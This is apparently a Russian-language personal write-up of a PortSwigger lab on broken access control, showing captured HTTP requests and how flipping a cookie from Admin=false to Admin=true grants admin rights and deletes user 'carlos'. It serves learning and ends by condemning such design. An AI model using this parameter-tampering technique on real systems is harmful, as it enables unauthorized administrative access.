#### Параметры, которые решают всё
- 
    - **пример** 1: Запрос на логин выглядит так: `/login.jsp?admin=false`. А что если поменять на `admin=true`? это прям вывеска- добро пожаловать
      
    - **Пример 2** В куке лежит `role=user`. Заменить на `role=admin`. Сервер тупо верит куке? Это не клуб, а проходной двор..
	-**пример**:
	```
	 https://insecure-website.com/login/home.jsp?admin=true         https://insecure-website.com/login/home.jsp?role=1

=========

	👉	Это может быть

	- скрытое поле
	- кука
	- предустановленный параметр строки запроса


	```


лаба  https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter

задание:  дан путь /admin  - нужно попасть в админку и делит карлоса

----

вот стандартный запрос
```http
GET /my-account?id=wiener HTTP/2
Host: 0a4600c503beb3ac862f0f6b005c00e6.web-security-academy.net
Cookie: Admin=false; session=uappYleSJEMMGXeqRJ2VpBW6WK23B2Dp
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a4600c503beb3ac862f0f6b005c00e6.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

срвзу видно 
#### Cookie: Admin=false

подставляю путь из задания   /admin

```http
https://0a4600c503beb3ac862f0f6b005c00e6.web-security-academy.net/admin
```

![[accesscontroll01026-03-0119.24.34.png]]

а вот запрос на удаление карлоса

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a4600c503beb3ac862f0f6b005c00e6.web-security-academy.net
Cookie: Admin=false; session=uappYleSJEMMGXeqRJ2VpBW6WK23B2Dp
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4600c503beb3ac862f0f6b005c00e6.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

меняю 

Cookie: Admin=true

лаба решена

детский сад..

-----
#### вывод

Cookie: Admin=true - ВОТ ТАК ДЕЛАТЬ ОЧЕНЬ ПЛОХО 😂

для доступа к чему-либо должны быть токены, роли, логины и пароли
а не просто открытый параметр в url... удивительно, что такое задание вообще есть... может лет 30 назад такое работало?

